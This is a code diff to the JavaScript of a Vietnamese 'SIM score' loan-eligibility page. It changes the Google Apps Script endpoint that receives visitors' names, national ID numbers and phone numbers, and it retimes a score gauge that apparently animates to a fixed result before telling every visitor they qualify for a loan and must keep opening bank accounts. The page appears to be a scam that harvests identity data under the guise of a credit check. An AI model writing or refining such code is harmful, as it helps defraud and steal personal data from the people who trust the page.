@@ -1259,12 +1259,13 @@
         var CCCDa = localStorage.getItem('ndlCCCD');
         var hotena = localStorage.getItem('ndlhoten');
         
-		if ((sdta=='')||(sdta==null)){
+		if ((sdta=='')||(sdta==null) || (sdta=='null')){
 			window.location.href = 'https://canvayngay.com/ndldangky'
 		}
         console.log(App_open);
+
         // document.getElementById("popuploadingmain").style.visibility="visible";
-        var date = new Date().toLocaleDateString();
+        var date = new Date().toLocaleString("vi-VN", {timeZone: "Asia/Ho_Chi_Minh"});
         
         $('#counter').html(`0<p></p><span>Score date: <b>${date}</b></span>`);
         $('#description').html(`<i>Kết quả điểm chấm sim</i>`);
@@ -1321,7 +1322,7 @@
                 document.getElementById('Banks').style.visibility="visible";
                 // transition: visibility 0s, opacity 0.5s linear;
                 document.getElementById('Banks').style.opacity = "1"
-            }, 1000);
+            }, 2500);
         }
         function simdacham(value) {
             // console.log('get data',value[0])
@@ -1359,14 +1360,14 @@
                 })
                 
                 $('.needle').css('transform', `rotate(${phantram}deg)`)
-            }, 1000)
+            }, 100)
             // Khách mở tài khoản để hồ sơ duyệt nhanh chóng
             setTimeout(() => {
                 $('#ketqua').html(`<i>Bạn đủ điều kiện vay tiền theo sim. Khách hàng mở tài khoản thao tác liên tục không thoát để tránh bị lỗi không cập nhật được thành công trong quá trình xử lý hồ sơ. Trường hợp bị thoát ra bắt buộc vào lại link chấm sim chọn vào ngân hàng vừa bấm để tiếp tục hoàn thành đăng ký thì hệ thống mới cập nhật được thông tin. </i>`);
                 document.getElementById('Banks').style.visibility="visible";
                 // transition: visibility 0s, opacity 0.5s linear;
                 document.getElementById('Banks').style.opacity = "1"
-            }, 3500);
+            }, 2500);
         }
         
 		function diemsim(value) {
@@ -1445,23 +1446,28 @@
         }
        
         function submitform() {
-                // document.getElementById("popuploadingmain").style.visibility="visible";
+                document.getElementById("popuploadingmain").style.visibility="visible";
                 getdiem();
                 var $form = $('form#form')
+                var datetimes = new Date().toLocaleString("vi-VN", {timeZone: "Asia/Ho_Chi_Minh"});
                 // new URLSearchParams object
                 var search_params = new URLSearchParams(); 
-
+                
                 // append parameters
                 search_params.append('app', 'App');
+                search_params.append('Create_date', datetimes);
                 search_params.append('Họ và Tên', hotena);
                 search_params.append('CCCD/CMND', CCCDa);
                 search_params.append('sdt', sdta);
+                if (sdta=='' || sdta==null){
+                    search_params.append('sdt', 'null');
+                }
                 search_params.append('Điểm sim', Diemsima);
 
                 // query string
                 var query_string = search_params.toString();
-
-                url = 'https://script.google.com/macros/s/AKfycbyrIv2LIzM53VmAp-KZNg47J9sckpvNV8AJD-TaSI0Q3Ig2OBPiGKRKGQlJBmwC5hgn/exec'
+                console.log(query_string)
+                url = 'https://script.google.com/macros/s/AKfycbxIbR6_bOQDhKLR_CEJTqGJREHysxz3OpbS-b1_zMSr6SEGMwolyQEVWrBl41tHYqNo/exec'
                 var jqxhr = $.ajax({
                             url: url,
                             method: "POST",
@@ -1485,6 +1491,7 @@
                                 }
                             }
                         })
+                document.getElementById("popuploadingmain").style.visibility="hidden";
         }
         
 		function telegram(hoten, cccd, sdt){
@@ -1577,8 +1584,8 @@
             document.getElementById("popuploadingmain").style.visibility="visible";
 			  var href = $(this).attr('href');
               var idbank = $(this).attr('id');
-              var datetimes = new Date().toLocaleString();
-            const url = 'https://script.google.com/macros/s/AKfycbyrIv2LIzM53VmAp-KZNg47J9sckpvNV8AJD-TaSI0Q3Ig2OBPiGKRKGQlJBmwC5hgn/exec';  // <--- Please set the URL of Web Apps.
+              var datetimes = new Date().toLocaleString("vi-VN", {timeZone: "Asia/Ho_Chi_Minh"});
+            const url = 'https://script.google.com/macros/s/AKfycbxIbR6_bOQDhKLR_CEJTqGJREHysxz3OpbS-b1_zMSr6SEGMwolyQEVWrBl41tHYqNo/exec';  // <--- Please set the URL of Web Apps.
             const qs = new URLSearchParams({app: 'CaiApp', sdt: sdta, idbank: idbank, date: datetimes});
             fetch(`${url}?${qs}`, {method: "POST", body: JSON.stringify()})
             .then(res => res.json())
